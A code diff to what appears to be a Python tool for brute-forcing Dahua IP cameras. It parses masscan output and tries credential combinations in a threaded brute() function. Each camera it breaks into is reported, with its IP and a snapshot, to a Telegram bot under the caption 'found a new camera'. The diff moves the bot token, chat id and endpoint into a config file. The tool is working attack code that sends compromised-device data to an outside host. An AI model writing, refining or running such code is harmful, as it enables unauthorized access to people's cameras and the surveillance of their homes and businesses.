@@ -16,6 +16,7 @@ from tqdm import tqdm
 
 from . import combinations
 from . import parse_masscan
+from .config import config
 from .dahua import DahuaController
 
 LOGGING_FOLDER = Path("dahua_logs")
@@ -174,7 +175,7 @@ def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, 
     if not token or not chat_id:
         return False
 
-    url = f"https://api.telegram.org/bot{token}"
+    url = f"https://{config.tg_endpoint}/bot{token}"
     caption = (
         "📷 <b>нашел новую камеру</b>\n\n"
         f"🌐 айпи: <code>{device[0]}</code>\n"
@@ -330,8 +331,6 @@ def read_targets(file_path: str) -> list[str]:
 
 
 def brute(
-    token: str | None = None,
-    id: int | str | None = None,
     brute_file_path: str = "input.txt",
     dosnap: bool = True,
     threads: int = 100,
@@ -382,8 +381,8 @@ def brute(
                 creds,
                 dosnap,
                 notify,
-                token,
-                id
+                config.bot_token,
+                config.userid
             )
             workers.append(future)
 
